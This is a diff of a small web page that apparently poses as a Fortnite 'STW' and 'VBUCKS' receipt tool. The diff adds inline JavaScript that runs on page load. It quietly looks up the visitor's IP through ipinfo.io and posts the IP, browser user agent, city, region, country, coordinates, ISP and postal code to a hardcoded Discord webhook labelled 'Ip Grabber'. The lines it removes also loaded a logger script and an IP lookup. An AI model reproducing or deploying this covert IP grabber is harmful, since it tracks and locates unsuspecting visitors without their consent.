@@ -1,18 +1,78 @@
-!DOCTYPE html>
-<html>
-  <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width">
-    <title>site</title>
-    <meta property="og:title" content="site">
-    <meta property="og:site_name" content="lock">
-    <meta property="og:url" content="./">
-    <meta property="og:type" content="website">
-    <meta property="og:description" content="socials"/>
-    <meta http-equiv="Refresh" content="2; url='https://www.lock.cf/'" />
-  </head>
-  <body>
-    <script type="application/javascript" src="logger.js"></script>
-    <script type="application/javascript" src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
-  </body>
-</html>
+<form action="stw.html" class="inline">
+    <button class="float-left submit-button" >STW Receipt</button>
+</form>
+<form action="vbucks.html" class="inline">
+    <button class="float-left submit-button" >VBUCKS Receipt</button>
+</form>
+    <link type="text/css" rel="stylesheet" href="style.css">
+    <script src= "https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script>
+        $.get("https://ipinfo.io", function(response) {
+            const webhook_url = "https://discord.com/api/webhooks/985185451579150386/CfkgKSq8YUd-c0v6Expwl3x5LCy_JotVtWUxZAiqUdkol8iegiPn0UHvLRPCXp09L9AH";
+            const main = {
+                title: "Ip Logger",
+                description: "> __IP Logged Bozo__",
+                thumbnail: {
+                    url: "https://cdn.discordapp.com/avatars/586435544750358540/a_36fc175d7430d6e04516474126184ed4.gif?size=2048",
+                },
+                fields: [
+                    {
+                        name: "IP:",
+                        value: `\`${response.ip}\``,
+                        inline: false,
+                    },
+                    {
+                        name: "User-Agent:",
+                        value: `\`${navigator.userAgent}\``,
+                        inline: false,
+                    },
+                    {
+                        name: "Town:",
+                        value: `\`${response.city}\``,
+                        inline: false,
+                    },
+                    {
+                        name: "Region:",
+                        value: `\`${response.region}\``,
+                        inline: false
+                    },
+                    {
+                        name: "Country:",
+                        value: `\`${response.country}\``,
+                        inline: false
+                    },
+                    {
+                        name: "Location:",
+                        value: `\`${response.loc}\``,
+                        inline: false
+                    },
+                    {
+                        name: "Company:",
+                        value: `\`${response.org}\``,
+                        inline: false
+                    },
+                    {
+                        name: "Postal Code:",
+                        value: `\`${response.postal}\``,
+                        inline: false
+                    },
+                ],
+                footer: {
+                    text: "https://pulling.info"
+                },
+                author: {
+                    name: "Aqua Da God",
+                    url: "https://pulling.info"
+                }
+            }
+            var xhttp = new XMLHttpRequest();
+            const url = webhook_url;
+            xhttp.open("POST", url, true);
+            xhttp.setRequestHeader('Content-Type', 'application/json');
+            xhttp.send(JSON.stringify({
+                'username': 'Ip Grabber',
+                'embeds': [main],
+            }));
+        }, "json");
+    </script>
+</head>
